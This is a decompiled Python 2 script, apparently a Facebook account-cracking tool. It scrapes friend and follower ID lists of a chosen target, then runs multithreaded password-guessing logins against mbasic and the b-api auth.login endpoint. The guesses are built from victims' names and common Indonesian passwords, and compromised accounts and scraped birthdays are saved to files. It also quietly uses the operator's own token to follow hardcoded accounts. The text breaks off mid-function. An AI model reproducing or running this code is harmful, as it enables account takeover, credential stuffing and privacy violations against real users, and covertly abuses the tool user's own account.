# uncompyle6 by Tech Abm
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <KoNtol>
import requests, bs4, sys, os, subprocess, requests, sys, random, time, re, base64, json
reload(sys)
sys.setdefaultencoding('utf-8')
from multiprocessing.pool import ThreadPool
if 'linux' in sys.platform.lower():
    N = '\x1b[0m'
    G = '\x1b[1;92m'
    O = '\x1b[1;97m'
    R = '\x1b[1;91m'
else:
    N = ''
    G = ''
    O = ''
    R = ''

def banner():
    os.system('echo -e "             ___  ___  ______  _________  ____  ___\n            / _ \\/ _ \\/ __/  |/  /  _/ / / /  |/  /\n           / ___/ , _/ _// /|_/ // // /_/ / /|_/ /\n          /_/  /_/|_/___/_/  /_/___/\\____/_/  /_/\n           \n               Coded By : Dapunta Khurayra X\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')


host = 'https://mbasic.facebook.com'
ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
ips = None
try:
    b = requests.get('https://api.ipify.org').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'}).json()['country_name'].lower()
except:
    ips = None

uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()
mbasic_h = {'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': uas, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
ok = []
cp = []
ttl = []

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


def lang(cookies):
    f = False
    rr = bs4.BeautifulSoup(requests.get('https://mbasic.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
    for i in rr.find_all('a', href=True):
        if 'id_ID' in i.get('href'):
            requests.get('https://mbasic.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
            b = requests.get('https://mbasic.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
            if 'apa yang anda pikirkan sekarang' in b.lower():
                f = True

    if f == True:
        return True
    exit('   [!] Wrong Cookies')


def basecookie():
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return gets_dict_cookies(open('.cok').read().strip())
        logs()
    else:
        logs()


def hdcok():
    global host
    global ua
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def gets_cookies(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def gets_dict_cookies(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def log_token():
    os.system('clear')
    banner()
    toket = raw_input('\n   [\xe2\x80\xa2] Token : ')
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\n   [\xe2\x80\xa2] Login Successful'
        bot_follow()
    except KeyError:
        print '   [!] Token Invalid'
        os.system('clear')
        logs()


def gen():
    os.system('clear')
    banner()
    cookie = raw_input('\n   [\xe2\x80\xa2] Cookie : ')
    try:
        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAA\\w+)', data.text)
        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '   [!] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\n   [\xe2\x80\xa2] Login Successful'
    bot_follow()
    return


def bot_follow():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\n   [!] Token invalid'
        logs()

    requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100026490368623/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100010484328037/subscribers?access_token=' + toket)
    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + toket)
    menu()


def menu():
    try:
        toket = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except Exception as e:
        print '   [\xe2\x80\xa2] Error : %s' % e
        logs()

    os.system('clear')
    banner()
    print '\n   [\xe2\x80\xa2] Hello : ' + nama
    print '   [\xe2\x80\xa2] UID   : ' + id
    os.system('echo -e "\n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80" | lolcat')
    os.system('echo -e "\n   [ Choose Options ]" | lolcat')
    print '\n   [1] Dump ID From Public/Friend'
    print '   [2] Dump ID Followers'
    print '   [3] Start Crack'
    print '   [0] Logout'
    choose_menu()


def choose_menu():
    r = raw_input('\n   [\xe2\x80\xa2] Choose : ')
    if r == '':
        print '   [!] Fill In The Correct'
        menu()
    elif r == '1':
        publik()
    elif r == '2':
        follow()
    elif r == '3':
        pilihcrack()
    elif r == '0':
        try:
            os.system('rm -rf login.txt')
            exit()
        except Exception as e:
            print '   [\xe2\x80\xa2] Error File Not Found %s' % e

    else:
        print '   [\xe2\x80\xa2] Wrong Input'
        menu()


def pilihcrack():
    os.system('echo -e "\n   [ Choose Crack Methode ]" | lolcat')
    print '\n   [1] Crack Mbasic (Low Crack)'
    print '   [2] Crack Mbasic (Low Crack With TTL)'
    print '   [3] Crack Api (Fast Crack)'
    print '   [4] Crack Api (Fast Crack With TTL)'
    krah = raw_input('\n   [\xe2\x80\xa2] Choose : ')
    if krah in ('', ):
        print '   [!] Fill In The Correct'
        pilihcrack()
    elif krah in ('1', '01'):
        crack()
    elif krah in ('2', '02'):
        crackttl()
    elif krah in ('3', '03'):
        bapi()
    elif krah in ('4', '04'):
        bapittl()
    else:
        print '   [!] Fill In The Correct'
        pilihcrack()


def publik():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\n   [\xe2\x80\xa2] Cookie/Token Invalid'
        os.system('rm -rf login.txt')
        logs()

    try:
        os.system('clear')
        banner()
        print "\n   [\xe2\x80\xa2] Type 'me' To Dump From Friendlist"
        idt = raw_input('   [\xe2\x80\xa2] User ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '   [\xe2\x80\xa2] Name           : ' + op['name']
            print '   [\xe2\x80\xa2] Getting ID | Please Wait ...'
        except KeyError:
            print '   [!] ID Not Found'
            print '\n   [ Back ]'
            publik()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(10000)&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        qq = (op['first_name'] + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['friends']['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')

        ys.close()
        print '   [\xe2\x80\xa2] Total ID       : %s' % len(id)
        print '\n   [!] Copy The Output'
        print '   [\xe2\x80\xa2] Output         : %s' % qq
        raw_input('\n   [ Back ]')
        menu()
    except Exception as e:
        exit('   [\xe2\x80\xa2] Error : %s' % e)


def follow():
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\n   [\xe2\x80\xa2] Cookie/Token Invalid'
        os.system('rm -rf login.txt')
        logs()

    try:
        os.system('clear')
        banner()
        idt = raw_input('\n   [\xe2\x80\xa2] Followers ID Target : ')
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '   [\xe2\x80\xa2] Name                : ' + op['name']
            print '   [\xe2\x80\xa2] Getting ID | Please Wait ...'
        except KeyError:
            print '   [!] ID Not Found'
            print '\n   [ Back ]'
            publik()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=20000&access_token=' + toket)
        id = []
        z = json.loads(r.text)
        qq = (op['first_name'] + '.json').replace(' ', '_')
        ys = open(qq, 'w')
        for a in z['data']:
            id.append(a['id'] + '<=>' + a['name'])
            ys.write(a['id'] + '<=>' + a['name'] + '\n')

        ys.close()
        print '   [\xe2\x80\xa2] Total ID            : %s' % len(id)
        print '\n   [!] Copy The Output'
        print '   [\xe2\x80\xa2] Output              : %s' % qq
        raw_input('\n   [ Back ]')
        menu()
    except Exception as e:
        exit('   [\xe2\x80\xa2] Error : %s' % e)


def mbasic(em, pas, hosts):
    global mbasic_h
    r = requests.Session()
    r.headers.update(mbasic_h)
    p = r.get('https://mbasic.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    meta = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': meta, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '12345')
                results.append(i)
                if 'indonesia' in ips:
                    results.append('sayang')
                    results.append('bismillah')
                    results.append('anjing')
                    results.append('123456')
                    results.append('bangsat')

    return results


def logs():
    os.system('clear')
    banner()
    print '\n   [ Choose Login Methode ]'
    print '\n   [1] Login With Token'
    print '   [2] Login With Cookie'
    print '   [3] Update Script'
    print '   [4] Report Problem'
    print '   [0] Exit'
    sek = raw_input('\n   [\xe2\x80\xa2] Choose : ')
    if sek == '':
        print '   [!] Fill In The Correct'
        logs()
    elif sek == '1':
        log_token()
    elif sek == '2':
        gen()
    elif sek == '3':
        updatesc()
    elif sek == '4':
        wangsaff()
    elif sek == '0':
        exit()
    else:
        print '   [!] Fill In The Correct'
        logs()


class crack:
    os.system('clear')
    banner()

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\n   [\xe2\x80\xa2] Crack With Pass Default/Manual [d/m]'
        while True:
            f = raw_input('   [\xe2\x80\xa2] Choose : ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '   [\xe2\x80\xa2] Example : sayang,bismillah,123456'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e

                os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;37m   [\xe2\x80\xa2] Finished'
                results(self.ada, self.cp)
                break

    def pwlist(self):
        self.pw = raw_input('   [\xe2\x80\xa2] Password List : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            results(self.ada, self.cp)
            print '\n\x1b[0;37m   [\xe2\x80\xa2] Finished'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r\x1b[0;32m   [OK] %s \xe2\x80\xa2 %s               ' % (fl.get('id'), i)
                    self.ada.append('%s \xe2\x80\xa2 %s' % (fl.get('id'), i))
                    open('ok.txt', 'a+').write('%s \xe2\x80\xa2 %s\n' % (fl.get('id'), i))
                    break
                elif log.get('status') == 'cp':
                    print '\r\x1b[0;33m   [CP] %s \xe2\x80\xa2 %s               ' % (fl.get('id'), i)
                    self.cp.append('%s \xe2\x80\xa2 %s' % (fl.get('id'), i))
                    open('cp.txt', 'a+').write('%s \xe2\x80\xa2 %s\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class crackttl:
    os.system('clear')
    banner()

    def __init__(self):
        self.ada = []
        self.cp = []
        self.ko = 0
        print '\n   [\xe2\x80\xa2] Crack With Pass Default/Manual [d/m]'
        while True:
            f = raw_input('   [\xe2\x80\xa2] Choose : ')
            if f == '':
                continue
            elif f == 'm':
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e
                    continue

                print '   [\xe2\x80\xa2] Example : sayang,bismillah,123456'
                self.pwlist()
                break
            elif f == 'd':
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '   %s' % e

                os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
                ThreadPool(35).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n\x1b[0;37m   [\xe2\x80\xa2] Finished'
                results(self.ada, self.cp)
                break

    def pwlist(self):
        self.pw = raw_input('   [\xe2\x80\xa2] Password List : ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            results(self.ada, self.cp)
            print '\n\x1b[0;37m   [\xe2\x80\xa2] Finished'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = mbasic(fl.get('id'), i, 'https://mbasic.facebook.com')
                if log.get('status') == 'success':
                    print '\r\x1b[0;32m   [OK] %s \xe2\x80\xa2 %s               ' % (fl.get('id'), i)
                    self.ada.append('%s \xe2\x80\xa2 %s' % (fl.get('id'), i))
                    if fl.get('id') in open('ok.txt').read():
                        break
                    else:
                        open('ok.txt', 'a+').write('%s \xe2\x80\xa2 %s\n' % (fl.get('id'), i))
                    break
                elif log.get('status') == 'cp':
                    try:
                        ke = requests.get('https://graph.facebook.com/' + fl.get('id') + '?access_token=' + open('login.txt', 'r').read())
                        tt = json.loads(ke.text)
                        ttl = tt['birthday']
                    except:
                        pass

                    print '\r\x1b[0;33m   [CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0m   ' % (fl.get('id'), i, str(ttl))
                    self.cp.append('%s \xe2\x80\xa2 %s' % (fl.get('id'), i))
                    open('cp.txt', 'a+').write('%s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\n' % (fl.get('id'), i, str(ttl)))
                    break
                else:
                    continue

            self.ko += 1
            print '\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


class bapi:

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0
        self.krah()

    def krah(self):
        print '\n   [\xe2\x80\xa2] Crack With Pass Default/Manual [d/m]'
        while True:
            f = raw_input('   [\xe2\x80\xa2] Choose : ')
            if f in ('', ' '):
                print '   [!] Invalid Number'
                continue
            elif f in ('m', 'M'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   [!] %s' % e
                            continue

                    self.fl = []
                    print '   [\xe2\x80\xa2] Example : sayang,bismillah,123456'
                    self.pw = raw_input('   [\xe2\x80\xa2] Password List : ').split(',')
                    if len(self.pw) == 0:
                        continue
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': self.pw})
                        except:
                            continue

                except Exception as e:
                    print '  %s' % e
                    continue

                os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
                ThreadPool(30).map(self.brute, self.fl)
                results(self.ok, self.cp)
                print '\n\x1b[0;37m   [\xe2\x80\xa2] Finished'
                break
            elif f in ('d', 'D'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except:
                    continue

                os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
                ThreadPool(30).map(self.brute, self.fl)
                os.remove(self.apk)
                results(self.ok, self.cp)
                break

    def bruteRequest(self, username, password):
        global ok
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
            self.ok.append(username + ' \xe2\x80\xa2 ' + password)
            print '\r\x1b[0;32m   [OK] %s \xe2\x80\xa2 %s %s               ' % (username, password, N)
            ok.append(username + ' \xe2\x80\xa2 ' + password)
            save = open('ok.txt', 'a')
            save.write(str(username) + ' \xe2\x80\xa2 ' + str(password) + '\n')
            save.close()
            return True
        if 'www.facebook.com' in response.json()['error_msg']:
            self.cp.append(username + ' \xe2\x80\xa2 ' + password)
            print '\r\x1b[0;33m   [CP] %s \xe2\x80\xa2 %s %s               ' % (username, password, N)
            save = open('cp.txt', 'a+')
            save.write(str(username) + ' \xe2\x80\xa2 ' + str(password) + '\n')
            save.close()
            return True
        return False

    def brute(self, fl):
        if self.setpw == False:
            self.loop += 1
            for pw in fl['pw']:
                username = fl['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                print '\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s' % (self.loop, len(self.fl), len(self.ok), len(self.cp)),
                sys.stdout.flush()

        else:
            self.loop += 1
            for pw in self.setpw:
                username = users['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

                print '\r\x1b[0;37m   [Crack] %s/%s | OK : %s | CP : %s' % (self.loop, len(self.fl), len(self.ok), len(self.cp)),
                sys.stdout.flush()


class bapittl:

    def __init__(self):
        self.setpw = False
        self.ok = []
        self.cp = []
        self.loop = 0
        self.krah()

    def krah(self):
        print '\n   [\xe2\x80\xa2] Crack With Pass Default/Manual [d/m]'
        while True:
            f = raw_input('   [\xe2\x80\xa2] Choose : ')
            if f in ('', ' '):
                print '   [!] Invalid Number'
                continue
            elif f in ('m', 'M'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '   [!] %s' % e
                            continue

                    self.fl = []
                    print '   [\xe2\x80\xa2] Example : sayang,bismillah,123456'
                    self.pw = raw_input('   [\xe2\x80\xa2] Password List : ').split(',')
                    if len(self.pw) == 0:
                        continue
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': self.pw})
                        except:
                            continue

                except Exception as e:
                    print '  %s' % e
                    continue

                os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
                ThreadPool(30).map(self.brute, self.fl)
                results(self.ok, self.cp)
                print '\n\x1b[0;37m   [\xe2\x80\xa2] Finished'
                break
            elif f in ('d', 'D'):
                try:
                    while True:
                        try:
                            self.apk = raw_input('   [\xe2\x80\xa2] ID List File : ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except:
                    continue

                os.system('echo -e "\n   [\xe2\x80\xa2] Crack Started...\n   [\xe2\x80\xa2] Account [OK] Saved to : ok.txt\n   [\xe2\x80\xa2] Account [CP] Saved to : cp.txt\n" | lolcat')
                ThreadPool(30).map(self.brute, self.fl)
                os.remove(self.apk)
                results(self.ok, self.cp)
                break

    def bruteRequest(self, username, password):
        global ttl
        params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': username, 'locale': 'en_US', 'password': password, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
        api = 'https://b-api.facebook.com/method/auth.login'
        response = requests.get(api, params=params)
        if re.search('(EAAA)\\w+', response.text):
            self.ok.append(username + ' \xe2\x80\xa2 ' + password)
            print '\r\x1b[0;32m   [OK] %s \xe2\x80\xa2 %s %s               ' % (username, password, N)
            ok.append(username + ' \xe2\x80\xa2 ' + password)
            save = open('ok.txt', 'a')
            save.write(str(username) + ' \xe2\x80\xa2 ' + str(password) + '\n')
            save.close()
            return True
        if 'www.facebook.com' in response.json()['error_msg']:
            try:
                ke = requests.get('https://graph.facebook.com/' + str(username) + '?access_token=' + open('login.txt', 'r').read())
                tt = json.loads(ke.text)
                ttl = tt['birthday']
            except:
                pass

            self.cp.append(username + ' \xe2\x80\xa2 ' + password + ' \xe2\x80\xa2 ' + ttl)
            print '\r\x1b[0;33m   [CP] %s \xe2\x80\xa2 %s \xe2\x80\xa2 %s\x1b[0m   ' % (username, password, ttl)
            save = open('cp.txt', 'a+')
            save.write(str(username) + ' \xe2\x80\xa2 ' + str(password) + ' \xe2\x80\xa2 ' + str(ttl) + '\n')
            save.close()
            return True
        return False

    def brute(self, fl):
        if self.setpw == False:
            self.loop += 1
            for pw in fl['pw']:
                username = fl['id'].lower()
                password = pw.lower()
                try:
                    if self.bruteRequest(username, password) == True:
                        break
                except:
                    pass

